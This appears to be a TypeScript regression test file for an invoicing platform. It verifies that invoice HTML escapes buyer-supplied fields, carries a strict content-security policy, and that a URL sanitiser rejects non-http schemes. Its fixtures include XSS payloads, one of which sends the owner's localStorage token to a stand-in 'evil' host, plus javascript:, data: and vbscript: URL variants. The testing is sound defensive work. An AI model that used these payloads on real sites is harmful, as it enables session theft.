import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { buildPlatformInvoiceHtml, type PrintableInvoice, type SellerInfo } from './platformInvoicePrint';
import { safeHttpUrl } from './safeUrl';

/**
 * ثغرتا سرقة جلسة مالك المنصّة (مراجعة ٣٠ سبتمبر ٢٠٢٦، SEC-1 وINT-2): نصٌّ يكتبه طرفٌ خارجي كان يُنفَّذ شيفرةً في
 * أصل fieldsa.net فيقرأ توكن المالك من localStorage — وبه تُدخل كل الشركات.
 */

const EVIL = `<img src=x onerror="fetch('//evil/?'+localStorage.sa_token)">`;
const inv: PrintableInvoice = {
  number: `INV-1"><script>alert(1)</script>`,
  buyerName: EVIL,
  buyerVatNo: `3"><svg onload=alert(1)>`,
  description: `</td></tr></table><script>alert(2)</script>`,
  totalSar: 115, vatSar: 15, netSar: 100,
  qrBase64: 'AQ==', issuedAt: '2026-09-30T10:00:00Z',
};
const seller: SellerInfo = { name: `مؤسسة 'x' & "y"`, vatNumber: '300000000000003', crNumber: '1010', address: '<b>الرياض</b>' };

test('طباعة فاتورة المنصّة: كل حقلٍ يكتبه المشترك يُهرَّب، ولا وسم ولا سكربت يتسلّل', () => {
  const html = buildPlatformInvoiceHtml(inv, seller, 'data:image/png;base64,iVBORw0KGgo=', '٣٠ سبتمبر ٢٠٢٦');
  assert.doesNotMatch(html, /<script/i, 'سكربت في الصفحة');
  // وسمٌ حقيقي يحمل معالج حدث (النصّ المُهرَّب يبقى كلماتٍ بلا وسم)
  assert.doesNotMatch(html, /<img src=x|<svg|<[a-z][^>]*on(error|load)=/i, 'وسمٌ من بيانات المشترك');
  assert.ok(html.includes('&lt;img src=x onerror=&quot;'), 'الاسم لم يُعرض نصّاً');
  assert.ok(html.includes('مؤسسة &#39;x&#39; &amp; &quot;y&quot;'));
  assert.ok(html.includes('&lt;b&gt;الرياض&lt;/b&gt;'));
  assert.ok(html.includes('<img src="data:image/png;base64,iVBORw0KGgo=" alt="ZATCA QR">'), 'رمز QR الصالح غاب');
});

test('طباعة فاتورة المنصّة: سياسة محتوى تمنع كل سكربت، وQR لا يُقبل إلا صورة PNG مضمَّنة', () => {
  const html = buildPlatformInvoiceHtml(inv, seller, `x" onerror="alert(1)`, 'd');
  assert.match(html, /<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'">/);
  assert.ok(html.indexOf('Content-Security-Policy') < html.indexOf('<title>'), 'السياسة بعد أول محتوى');
  assert.ok(!html.includes('alt="ZATCA QR"'), 'QR غير صالح عُرض');
  assert.doesNotMatch(html, /<[a-z][^>]*onerror=/i);
  assert.doesNotMatch(buildPlatformInvoiceHtml(inv, seller, 'javascript:alert(1)', 'd'), /javascript:/);
});

test('safeHttpUrl: http/https وحدهما، وكل مخطّط آخر (javascript وdata وvbscript ومموّهاته) يُردّ', () => {
  assert.equal(safeHttpUrl('https://example.com/a?b=1'), 'https://example.com/a?b=1');
  assert.equal(safeHttpUrl('http://example.com'), 'http://example.com/');
  assert.equal(safeHttpUrl('example.com'), 'https://example.com/', 'نطاقٌ بلا مخطّط يُعامل https');
  assert.equal(safeHttpUrl('shop.sa:8443'), 'https://shop.sa:8443/', 'نطاقٌ بمنفذ ليس مخطّطاً');
  assert.match(String(safeHttpUrl('javascript:1')), /^https:/, 'ما يشبه المخطّط ويتبعه رقم يصير https لا javascript');
  for (const bad of ['javascript:alert(1)', 'JavaScript:alert(1)', '  javascript:alert(1)', 'java\tscript:alert(1)', 'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)', 'javascript:alert(1)//linkedin.com', 'mailto:a@b.c', '', null, undefined]) {
    assert.equal(safeHttpUrl(bad as string | null | undefined), null, String(bad));
  }
});

test('حارس: لوحة العملاء المحتملين لا تضع موقع العميل ولا رابط خريطته في href إلا عبر safeHttpUrl', () => {
  const src = fs.readFileSync(path.resolve(process.cwd(), 'src', 'components', 'LeadsPanel.tsx'), 'utf8');
  // أيّ صيغة: href أو window.open يحملان website أو mapsUrl خاماً (lead. أو l. أو قالب) — لا تمرّ إلا عبر safeHttpUrl
  assert.doesNotMatch(src, /href=\{[^}]*\.(website|mapsUrl)/, 'رابطٌ خام من مصدر عام');
  assert.doesNotMatch(src, /window\.open\([^)]*\.(website|mapsUrl)/, 'فتحُ رابطٍ خام من مصدر عام');
  assert.match(src, /const websiteHref = safeHttpUrl\(lead\.website\);/);
  assert.match(src, /const mapsHref = safeHttpUrl\(lead\.mapsUrl\);/);
});
